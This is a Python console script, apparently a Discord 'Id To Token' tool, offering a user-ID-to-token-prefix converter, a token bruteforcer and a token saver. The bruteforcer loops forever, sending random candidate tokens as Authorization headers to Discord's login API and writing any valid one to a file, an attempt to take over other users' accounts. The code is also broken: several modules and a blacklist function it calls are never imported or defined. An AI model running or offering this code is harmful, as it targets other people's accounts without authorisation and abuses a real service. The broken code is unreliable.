import sys
import time
import os
import hashlib
from time import sleep
from datetime import datetime
from colorama import Fore
from pystyle import *
import getpass

# FORE COLORS
w = Fore.LIGHTWHITE_EX
r = Fore.RED
g = Fore.LIGHTGREEN_EX
b = Fore.LIGHTBLUE_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
black = Fore.LIGHTBLACK_EX

def slow_print(msg):
    for char in msg:
        print(char, end='', flush=True)
        time.sleep(0.5/20)

    
    print()

def print_gradient_line(length):
    for i in range(length):
        ratio = i / (length - 1)
        print(f"{Fore.RED}═", end="")
    
    print(Style.RESET_ALL)

def answer():
    while True:
        os.system(f"title Menu  \  Id To Token  /  By XYZAY__")
        os.system('cls' if os.name=='nt' else 'clear')
        print("")
        Write.Print("""            ===============================================================================================
                    
                d888888b d8888b.      d888888b  .d88b.       d888888b  .d88b.  db   dD d88888b d8b   db 
                  `88'   88  `8D      `~~88~~' .8P  Y8.      `~~88~~' .8P  Y8. 88 ,8P' 88'     888o  88 
                   88    88   88         88    88    88         88    88    88 88,8P   88ooooo 88V8o 88 
                   88    88   88         88    88    88         88    88    88 88`8b   88~~~~~ 88 V8o88 
                  .88.   88  .8D         88    `8b  d8'         88    `8b  d8' 88 `88. 88.     88  V888 
                Y888888P Y8888D'         YP     `Y88P'          YP     `Y88P'  YP   YD Y88888P VP   V8P 
                    
            ===============================================================================================
        """, Colors.purple_to_blue, interval=0.000)

        print(f"\n{m}[{m}{w}1{w}{m}]{m}{w} Id to Token Converter")
        print(f"{m}[{m}{w}2{w}{m}]{m}{w} Token Bruteforcer")
        print(f"{m}[{m}{w}3{w}{m}]{m}{w} Token Saver")
        print(f"{m}[{m}{w}4{w}{m}]{m}{Fore.LIGHTRED_EX} Information")
        print(f"{m}[{m}{w}5{w}{m}]{m}{Fore.LIGHTRED_EX} Exit")

        try:
            ans = input(f"\n{m}[{m}{w}>{w}{m}]{m} {w}Choose option : {w}")

            if ans == "1":
                userid = input(f"\n{m}[{w}INPUT{m}]{w} User Id : ")

                if check_blacklist(userid):
                    encodedBytes = base64.b64encode(userid.encode("utf-8"))
                    encodedStr = str(encodedBytes, "utf-8")
                    print(f"{m}[{w}LOGS{m}]{w} Token First Part : {Fore.GREEN}{encodedStr}")

                    choice = input(f"\n{m}[{w}?{m}]{w} Copy to clipboard {m}({w}y/n{m}){w} : ").lower()

                    if choice == 'y':
                        token_to_copy = encodedStr
                        pyperclip.copy(token_to_copy)
                        print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Successfully copied token")
                        sleep(2)
                    elif choice == 'n':
                        print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Back to menu")
                        sleep(2)
                    else:
                        print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Invalid choice")
                        sleep(2)
                
            elif ans == "2":
                userid = input(f"\n{m}[{w}INPUT{m}]{w} User Id : ")

                if check_blacklist(userid):
                    id_to_token = base64.b64encode(userid.encode("ascii"))
                    id_to_token = str(id_to_token)[2:-1]
                    print()

                    while True:
                        token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
                        headers = {
                            'Authorization': token
                        }
                        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)

                        try:
                            if login.status_code == 200:
                                print(f'\n{m}[{m}{w}+{w}{m}]{m} {w}Valid | {g}' + token + f'{w} |')
                                f = open('token (Bruteforcer).txt', "a+")
                                f.write(f'{token}\n')
                                sleep(2)
                                exit()
                            else:
                                print(f'{m}[{m}{w}-{w}{m}]{m} {w}Invalid | {m}' + token + f'{w} |')
                        except Exception as e:
                                print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}{e}")
                                sleep(2)
                        finally:
                            pass

            elif ans == "3":
                pseudo_discord_info = input(f"\n{m}[{w}INPUT{m}]{w} Username : ")
                id_discord_info = input(f"{m}[{w}INPUT{m}]{w} User Id : ")
                token_discord_info = input(f"{m}[{w}INPUT{m}]{w} Token : ")

                info_text = f"""================================
Username : {pseudo_discord_info}
User Id : {id_discord_info}
Token : {token_discord_info}
================================
"""

                with open("Info Saved.txt", "a+") as file:
                    file.write(info_text)

                print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Successfully saved")
                sleep(2)

            elif ans == "4":
                print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}This porgram is developed by XYZAY__")
                print(f"\n{m}[{m}{w}>{w}{m}]{m} {w}Press any key to back to menu")
                os.system("pause>nul")
                print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Back to menu")
                sleep(2)
            elif ans == "5":
                choiceExit = input(f"\n{m}[{w}?{m}]{w} Exit the program{m} ({w}y/n{m}){w} : ").lower()

                if choiceExit == 'y':
                    print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Closing the program")
                    sleep(2)
                    exit()
                elif choiceExit == 'n':
                    print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Back to menu")
                    sleep(2)
                else:
                    print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Invalid choice")
                    sleep(2)
            else:
                print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Invalid choice")
                sleep(2)

        except KeyboardInterrupt:
            print(f"\n{m}[{m}{w}!{w}{m}]{m} {w}Invalid choice")
            sleep(2)

answer()
os.system("cls")